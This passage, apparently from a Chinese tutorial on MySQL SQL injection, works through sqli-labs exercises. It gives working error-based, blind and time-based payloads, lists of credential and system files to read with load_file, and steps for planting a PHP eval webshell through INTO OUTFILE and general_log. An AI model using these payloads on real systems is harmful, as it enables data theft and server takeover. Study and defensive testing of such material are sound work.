sec)\n```\n\n### 基于报错的SQL 盲注\n\n报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数\n\n报错注入就是利用了数据库的某些机制，认为的制造错误条件，使得查询结果能够 出现在错误信息中。\n\n构造payload 让信息通过错误提示回显出来\n\n```\nselect 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;\n```\n\n参考：<https://www.freebuf.com/column/235496.html>\n\n**floor()**\n\n> floor(x)\n>\n> 返回小于或等于 x 的最大整数　　\n\n```\nSELECT FLOOR(1.5) \n-- 返回1\n```\n\n```\nselect 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))\na from information_schema.columns group by a;\n```\n\n以上语句可以简化成如下的形式。\n\n```\nselect count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))\n```\n\n如果关键的表被禁用了，可以使用这种形式\n\n```\nselect count(*) from (select 1 union select null union\nselect !1) group by concat(version(),floor(rand(0)*2))\n```\n\n如果rand 被禁用了可以使用用户变量来报错\n\n```\nselect min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)\n```\n\n```sql\n爆库\nselect 1 from ( select count(*),(concat((select schema_name from information_schema.schemata limit\n0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x )a;\nhttp://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct\nconcat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit\n0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)\n爆表\nselect 1 from (select count(*),(concat((select table_name from information_schema.tables where\ntable_schema=database() limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;\n爆字段\nselect 1 from (select count(*),(concat((select column_name from information_schema.columns where\ntable_schema=database() and table_name=‘users’ limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tables\ngroup by x)a;\n爆数据\nselect 1 from (select count(*),(concat((select concat(name,’|’,passwd,’|’,birth) from users limit\n0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;\nselect 1 from(select count(*),concat((select (select (SELECT concat(0x23,name,0x3a,passwd,0x23) FROM users limit\n0,1)) from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a\n```\n\n**几何函数**\n\n```\nGeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))\n\npolygon()：id=1 AND polygon((select * from(select * from(select user())a)b))\n\nmultipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))\n\nmultilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))\n\nlinestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))\n\nmultipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))\n```\n\n**不存在函数**\n\n```\n可以用来爆数据库\nselect a();\nERROR 1305 (42000): FUNCTION mysql.a does not exist\n```\n\n**name_const()**\n\n```\n仅可取数据库版本信息\nselect * from(select name_const(version(),0x1),name_const(version(),0x1))a;\nERROR 1060 (42S21): Duplicate column name '5.5.29'\n```\n\n**uuid相关函数**\n\n```\n适用版本：8.0.x\nmysql> SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));\nmysql> SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));\n```\n\n**exp()**\n\n> exp(int)\n>\n> 返回e的x次方\n>\n> 适用版本：版本在5.5.5~5.5.49\n\n```\nselect exp(~(select * FROM(SELECT USER())a));\n--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。\n--double 数值类型超出范围\n--Exp()为以e 为底的对数函数；\n\n--ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'\n\n如果是在适用版本之外：虽然也会报错，但是表名不会出来\nselect !(select * from(select user())a)-~0;\n```\n\n**exp、cot、pow、abs等可以报错**\n\n```\nselect abs(99999e9999999); #可使用在报错的布尔盲注中\nERROR 1367 (22007): Illegal double '99999e9999999' value found during parsing\n\nselect pow(1+(1=1),999999999999);mysql> select pow(1+(1=1),999999999999);\nERROR 1690 (22003): DOUBLE value is out of range in 'pow((1 + (1 = 1)),999999999999)'\nmysql> select pow(1+(1=0),999999999999);\n+---------------------------+\n| pow(1+(1=0),999999999999) |\n+---------------------------+\n|                         1 |\n+---------------------------+\n1 row in set (0.00 sec)\n\n通过这种写法，可以实现报错注入\nselect pow(1+(表达式),999999999999)\n表达式可以是盲注的形式，返回1或者0，通过报错将字符才出来\n\n其他函数用法类似\n\nexp临界值709\nexp(709+(1=0))\n```\n\n可以参考exp 报错文章：<http://www.cnblogs.com/lcamry/articles/5509124.html>\n\n```\nselect !(select * from (select user())x) -（ps:这是减号） ~0\n--bigint 超出范围；~0 是对0 逐位取反，很大的版本在5.5.5 及其以上\n```\n\n可以参考文章bigint 溢出文章http://www.cnblogs.com/lcamry/articles/5509112.html\n\n```\nextractvalue(1,concat(0x7e,(select @@version),0x7e)) \n--mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误\n```\n\n```\nupdatexml(1,concat(0x7e,(select @@version),0x7e),1) \n--mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误\n```\n\n```\nselect * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;\n--mysql 重复特性，此处重复了version，所以报错。\n```\n\n**join using()注列名**\n\n通过系统关键词join可建立两个表之间的内连接。\n\n通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。\n\n并且报错信息会存在重复的列名，可以使用USING 表达式声明内连接（INNER JOIN）条件来避免报错。\n\n```\nmysql>select * from(select * from users a join (select * from users)b)c;\nmysql>select * from(select * from users a join (select * from users)b using(username))c;\nmysql>select * from(select * from users a join (select * from users)b\nusing(username,password))c\n```\n\n**GTID相关函数**\n\n从MySQL 5.6.5 开始新增了一种基于GTID 的复制方式。通过GTID 保证了每个在主库上提交的事务在集群中有一个唯一的ID。这种方式强化了数据库的主备一致性，故障恢复以及容错能力。\n\nGTID (Global Transaction ID)是全局事务ID,当在主库上提交事务或者被从库应用时，可以定位和追踪每一个事务，对DBA来说意义就很大了，我们可以适当的解放出来，不用手工去可以找偏移量的值了，而是通过CHANGE MASTER TO MASTER_HOST='xxx', MASTER_AUTO_POSITION=1的即可方便的搭建从库，在故障修复中也可以采用MASTER_AUTO_POSITION=‘X’的方式。\n\n可能大多数人第一次听到GTID的时候会感觉有些突兀，但是从架构设计的角度，GTID是一种很好的分布式ID实践方式，通常来说，分布式ID有两个基本要求： 1）全局唯一性 2）趋势递增 这个ID因为是全局唯一，所以在分布式环境中很容易识别，因为趋势递增，所以ID是具有相应的趋势规律，在必要的时候方便进行顺序提取，行业内适用较多的是基于Twitter的ID生成算法snowflake,所以换一个角度来理解GTID，其实是一种优雅的分布式设计。\n\n```\nmysql>select gtid_subset(user(),1);\nmysql>select gtid_subset(hex(substr((select * from users limit\n1,1),1,1)),1);\nmysql>select gtid_subtract((select * from(select user())a),1);\n```\n\n**报错函数速查表**\n\n**sqli-labs/less-5**\n\n**一：盲注**\n\n```sql\n（1）利用left(database(),3)进行尝试\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),3)=5.7--+\n    接下来看一下数据库的长度\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+\n    猜测数据库第一位\nhttp://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)>'a'--+\n    用此方法推测出其他几位\n（2）利用substr() ascii()函数进行尝试/left也可以，都行\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>65 --+\n    用此方法推测出其他几位，得到第一个表名\n    接下来用limit 1,1得到第二个表名，以此类推\n（3）利用regexp 获取表中的列\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+\n    用此方法推测出其他几位，得到列名\n（4）利用ord()和mid()函数获取users 表的内容\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+\n    解释：\n    IFNULL(v1,v2):如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。\n    CAST(x AS type)：转换数据类型\n    SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1\n    所以这句就是先从表users将username字段取出通过order by进行升序，取出第一行的数据，再cast将其转化为字    符类型，在通过IFNULL判断其里面的数据是否为空，不为空则返回其数据。\n以上（1）（2）（3）（4）我们通过使用不同的语句，通过布尔盲注SQL把所有的payload 进行演示了一次。想必通过实例更能够对sql 布尔盲注语句熟悉和理解了\n```\n\n**二：报错注入**\n\n```sql\n（1）首先使用报错注入，利用count、floor、group by进行报错\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+\n（2）利用double 数值类型超出范围进行报错注入\nhttp://127.0.0.1/sqli-labs/Less-5/?id=-1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+\n（3）利用bigint 溢出进行报错注入.\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+\n（4）xpath 函数报错注入\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+\n（5）updatexml 函数报错注入\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+\n（6）利用数据的重复性\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+\n```\n\n**updatexml()函数**\n\n- updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。\n- 作用：改变文档中符合条件的节点的值\n- 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据\n- updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）\n- 例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。\n- 适用版本: 5.1.5+\n\n```\nselect updatexml(1,concat(0x7e,(select user()),0x7e),1)\nERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'\n```\n\n**extractvalue()函数**\n\n- 此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n- extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）\n- select user,password from users where user_id=1 and (extractvalue(1,0x7e));\n- 由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。\n\n```\nselect extractvalue(1,concat(0x7e,(select user()),0x7e))\nERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'\n```\n\n**三：延时注入**\n\n```\n（1）利用sleep()函数进行注入，当错误的时候会有5 秒的时间延时。\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+\n（2）利用BENCHMARK()进行延时注入\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+\n当结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000 次，会占用一段时间。\n```\n\nsqli-labs/Less-9的payload\n\n```sql\n--猜测数据库：\nhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+\n--说明第一位是s （ascii 码是115）\nhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+\n说明第一位是e （ascii 码是101）\n....\n以此类推，我们知道了数据库名字是security\n猜测security 的数据表：\nhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+\n猜测第一个数据表的第一位是e,...依次类推，得到emails\nhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+\n猜测第二个数据表的第一位是r,...依次类推，得到referers\n...\n再以此类推，我们可以得到所有的数据表emails,referers,uagents,users\n猜测users 表的列：\nhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+\n猜测users 表的第一个列的第一个字符是i，\n以此类推，我们得到列名是id，username，password\n猜测username 的值：\nhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+\n猜测username 的第一行的第一位\n以此类推，我们得到数据库username，password 的所有内容\n以上的过程就是我们利用sleep()函数注入的整个过程，当然了可以离开BENCHMARK()函数进\n行注入\n```\n\n## 导入导出相关操作的讲解\n\n在了解导入导出相关操作时，先了解以下`Mysql`变量\n\n### mysql变量\n\nmysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。\n\n服务器启动时，将所有全局变量初始化为默认值。可以在选项文件或命令行中指定的选项来更改这些默认值。服务器启动后，通过连接服务器并执行`SET GLOBAL var_name`语句可以更改动态全局变量。要想更改全局变量，必须具有SUPER权限。\n\n服务器还为每个客户端连接维护会话变量。连接时使用相应全局变量的当前值对客户端会话变量进行初始化。客户可以通过`SET SESSION var_name`语句来更改动态会话变量。设置会话变量不需要特殊权限，但客户可以只更改自己的会话变量，而不更改其它客户的会话变量。\n\n可以通过`SHOW VARIABLES`语句查看系统变量及其值。\n\n```\nmysql> SHOW VARIABLES;\n```\n\n可以使用like语句来匹配和筛选。\n\n**secure_file_priv**\n\n> `secure_file_priv`对读写文件有影响。 `secure-file-priv`参数是用来限制`LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()`传到哪个指定目录的。 当`secure_file_priv`的值为`null` ，表示限制`mysqld` 不允许导入|导出。默认是`null` 当`secure_file_priv`的值为`/tmp/` ，表示限制`mysqld` 的导入|导出只能发生在`/tmp/`目录 下 当`secure_file_priv`的值没有具体值时，表示不对`mysqld` 的导入|导出做限制\n\n### load_file()导出文件\n\nLoad_file(file_name):读取文件并返回该文件的内容作为一个字符串。\n\n> **使用条件：** A、必须有权限读取并且文件必须完全可读\n>\n> and (select count() from mysql.user)>0 /* 如果结果返回正常,说明具有读写权限。\n>\n> and (select count() from mysql.user)>0 /* 返回错误，应该是管理员给数据库帐户降权\n>\n> B、欲读取文件必须在服务器上\n>\n> C、必须指定文件完整的路径\n>\n> D、欲读取文件必须小于max_allowed_packet 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想load_file 出来。\n>\n> 在实际的注入中，我们有两个难点需要解决：\n>\n> 绝对物理路径 构造有效的畸形语句（报错爆出绝对路径）\n>\n> 在很多PHP 程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP 程序来说，整个服务器的安全将受到严重的威胁。\n\n### WINDOWS下:\n\n> c:/boot.ini //查看系统版本\n>\n> c:/windows/php.ini //php配置信息\n>\n> c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码\n>\n> c:/winnt/php.ini\n>\n> c:/winnt/my.ini\n>\n> c:\\mysql\\data\\mysql\\user.MYD //存储了mysql.user表中的数据库连接密码\n>\n> c:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini //存储了虚拟主机网站路径和密码\n>\n> c:\\Program Files\\Serv-U\\ServUDaemon.ini\n>\n> c:\\windows\\system32\\inetsrv\\MetaBase.xml 查看IIS的虚拟主机配置\n>\n> c:\\windows\\repair\\sam //存储了WINDOWS系统初次安装的密码\n>\n> c:\\Program Files\\ Serv-U\\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此\n>\n> c:\\Program Files\\RhinoSoft.com\\ServUDaemon.exe\n>\n> C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere*.cif文件\n>\n> //存储了pcAnywhere的登陆密码\n>\n> c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf 或C:\\apache\\conf\\httpd.conf //查看WINDOWS系统apache文件\n>\n> c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.\n>\n> c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机\n>\n> d:\\APACHE\\Apache2\\conf\\httpd.conf\n>\n> C:\\Program Files\\mysql\\my.ini\n>\n> C:\\mysql\\data\\mysql\\user.MYD 存在MYSQL系统中的用户密码\n\n### LUNIX/UNIX 下:\n\n> /usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件\n>\n> /usr/local/apache2/conf/httpd.conf\n>\n> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置\n>\n> /usr/local/app/php5/lib/php.ini //PHP相关设置\n>\n> /etc/sysconfig/iptables //从中得到防火墙规则策略\n>\n> /etc/httpd/conf/httpd.conf // apache配置文件\n>\n> /etc/rsyncd.conf //同步程序配置文件\n>\n> /etc/my.cnf //mysql的配置文件\n>\n> /etc/redhat-release //系统版本\n>\n> /etc/issue\n>\n> /etc/issue.net\n>\n> /usr/local/app/php5/lib/php.ini //PHP相关设置\n>\n> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置\n>\n> /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件\n>\n> /usr/local/resin-3.0.22/conf/resin.conf //针对3.0.22的RESIN配置文件查看\n>\n> /usr/local/resin-pro-3.0.22/conf/resin.conf //同上\n>\n> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看\n>\n> /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件\n>\n> /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看\n>\n> /usr/local/resin-pro-3.0.22/conf/resin.conf 同上\n>\n> /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看\n>\n> /etc/sysconfig/iptables 查看防火墙策略\n>\n> load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录\n>\n> replace(load_file(0×2F6574632F706173737764),0×3c,0×20)\n>\n> replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))\n\n**示例：**\n\n```\nSelect load_file(‘/flag’);\nSELECT CONVERT(LOAD_FILE(\"/etc/passwd\") USING utf8);\n```\n\n```sql\nSelect 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,\n114,101,112,97,105,114,92,115,97,109))))\n利用hex()将文件内容导出来，尤其是smb文件时可以使用。\n-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))\nExplain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII 代码\n-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)\nExplain：“c:/boot.ini”的16 进制是“0x633a2f626f6f742e696e69”\n-1 union select 1,1,1,load_file(c:\\\\boot.ini)\nExplain:路径里的/用\\\\代替\n```\n\n### 文件导入到数据库(LOAD DATA INFILE)\n\nLOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。\n\n在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile 导入到数据库中。\n\n**示例：**\n\n```\nload data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\\t' lines terminated by '\\n'\n```\n\n将/tmp/t0.txt 导入到t0 表中，character set gbk 是字符集设置为gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。\n\n当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑/tmp 等文件夹。 TIPS：我们从mysql5.7 的文档看到添加了load xml 函数，是否依旧能够用来做注入还需要验证。\n\n### 导入到文件(OUTFILE)\n\nSELECT.....INTO OUTFILE 'file_name'\n\n可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name 不能是一个已经存在的文件。\n\n> mysql中的配置文件secure_file_priv变量如果为NULL，则不能导入\n>\n> [mysqld] secure_file_priv=\"/\"\n\n我们一般有两种利用形式： **第一种直接将select 内容导入到文件中：**\n\n```\nSelect version() into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php”\n```\n\n此处将`version()`替换成一句话，`\\<?php @eval($_post[“mima”])?>`\n\n也即 `Select\\<?php @eval($_post[“mima”])?> into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php”` 直接连接一句话就可以了，其实在select 内容中不仅仅是可以上传一句话的，也可以上传很多的内容。\n\n**第二种修改文件结尾：**\n\n```\nSelect version() Into outfile “c:\\\\phpnow\\\\htdocs\\\\test.php” LINES TERMINATED BY 0x16 进制文件\n```\n\n解释：通常是用`‘\\r\\n’`结尾，此处我们修改为自己想要的任何文件。同时可以用`FIELDS TERMINATED BY 16` 进制可以为一句话或者其他任何的代码，可自行构造。在`sqlmap` 中`os-shell` 采取的就是 这样的方式，具体可参考`os-shell` 分析文章：<http://www.cnblogs.com/lcamry/p/5505110.html> TIPS： （1）可能在文件路径当中要注意转义，这个要看具体的环境 （2）上述我们提到了`load_file()`,但是当前台无法导出数据的时候，我们可以利用下面的语句：\n\n```\nselect load_file(‘c:\\\\wamp\\\\bin\\\\mysql\\\\mysql5.6.17\\\\my.ini’) into outfile‘c:\\\\wamp\\\\www\\\\test.php’\n```\n\n可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。\n\n类似的还有一个`dumpfile`\n\n```\nselect \"<?php phpinfo();?>\" into dumpfile \"/tmp/1.php\";\noutfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式\n```\n\n当`secure_file_priv`为`NULL`时\n\n```sql\n如果存在堆叠注入，当然由于是global变量，需要root权限\nset global general_log=on;\nset global general_log_file='C:/phpStudy/WWW/789.php';\nselect '<?php eval($_POST['a']) ?>';\n```\n\n**sqli-labs/Less-7**\n\n```sql\n--使用')) or 1=1--+进行注入\nhttp://127.0.0.1/sqli-labs/Less-7/?id=1')) or 1=1 --+\n（2）利用上述提到的文件导入的方式进行演示：\nhttp://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,3 into outfile \"D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.txt\"--+\n（3）直接将一句话木马导入进去，再用菜刀等webshell 管理工具连接即可\nhttp://127.0.0.1/sqli-labs/Less-7/?id=-1'))UNION SELECT 1,2,'<?php @eval($_post[“mima”])?>' into outfile \"D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.php\"--+\n（4）这里也可以到处数据库的内容\n```\n\n## 增删改函数介绍\n\n在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下mysql 的增删改。查就是我们上述总用到的select，这里就介绍了。\n\n增加一行数据。\n\n**Insert**\n\n**删除**\n\n> 删除数据: delete from 表名; delete from 表名where id=1; 删除结构： 删数据库：drop database 数据库名; 删除表：drop table 表名; 删除表中的列:alter table 表名drop column 列名;\n>\n> **修改** 修改所有：updata 表名set 列名='新的值，非数字加单引号' ; 带条件的修改：updata 表名set 列名='新的值，非数字加单引号' where id=6;\n\n## HTTP 头部介绍\n\n在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。 HTTP 头部详解 1、Accept：告诉WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。 2、Accept-Charset： 浏览器申明自己接收的字符集\n\nAccept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate） Accept-Language：：浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk 等等。 3、Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。 4、Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。 5、Authorization：当客户端接收到来自WEB 服务器的WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB 服务器。 6、Cache-Control：请求：no-cache（不要缓存的实体，要求现在从WEB 服务器去取） max-age：（只接受Age 值小于max-age 值，并且没有过期的对象） max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale 值） min-fresh：（接受其新鲜生命期大于其当前Age 跟min-fresh 值之和的缓存对象） 响应：public(可以用Cached 内容回应任何用户) private（只能用缓存内容回应先前请求该内容的那个用户） no-cache（可以缓存，但是只有在跟WEB 服务器验证了其有效后，才能返回给客户端） max-age：（本响应包含的对象的过期时间） ALL: no-store（不允许缓存） 7、Connection：请求：close（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。 keepalive（告诉WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。 响应：close（连接已经关闭）。 keepalive（连接保持着，在等待本次连接的后续请求）。 Keep-Alive：如果浏览器请求保持连接，则该头部表明希望WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300 8、Content-Encoding：WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip 9、Content-Language：WEB 服务器告诉浏览器自己响应的对象的语言。 10、Content-Length： WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length:26012 11、Content-Range： WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022 12、Content-Type： WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml 13、ETag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html 文件，如果被修改了，其Etag 也会别修改，所以ETag 的作用跟Last-Modified 的作用差不多，主要供WEB 服务器判断一个对象是否改变了。比如前一次请求某个html 文件时，获得了其ETag，当这次又请求这个文件时，浏览器就会把先前获得的ETag 值发送给WEB 服务器，然后WEB 服务器会把这个ETag 跟该文件的当前ETag 进行对比，然后就知道这个文件有没有改变了。 14、Expired：WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB 服务器验证了其有效性后，才能用来响应客户请求。是HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT 15、Host：客户端指定自己想访问的WEB 服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn 16、If-Match：如果对象的ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。 17、If-None-Match：如果对象的ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。 18、If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（ 比如返回对象）， 否则返回代码304 ，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu, 10 Apr 2008 09:14:42 GMT 19、If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。 20、If-Range：浏览器告诉WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的ETag 或者自己所知道的最后修改时间给WEB 服务器，让其判断对象是否改变了。总是跟Range 头部一 起使用。 21、Last-Modified：WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT 22、Location：WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如： Location ： <http://i0.sinaimg.cn/dy/deco/2008/0528/sinahome_0803_ws_005_text_0.gif> 23、Pramga：主要使用Pramga: no-cache，相当于Cache-Control： no-cache。例如：Pragma：no-cache 24、Proxy-Authenticate： 代理服务器响应浏览器，要求其提供代理身份验证信息。Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 25、Range：浏览器（比如Flashget 多线程下载时）告诉WEB 服务器自己想取对象的哪部分。例如：Range: bytes=1173546- 26、Referer：浏览器向WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：<http://www.sina.com/> 27、Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61(Unix) 28、User-Agent: 浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14 29、Transfer-Encoding: WEB 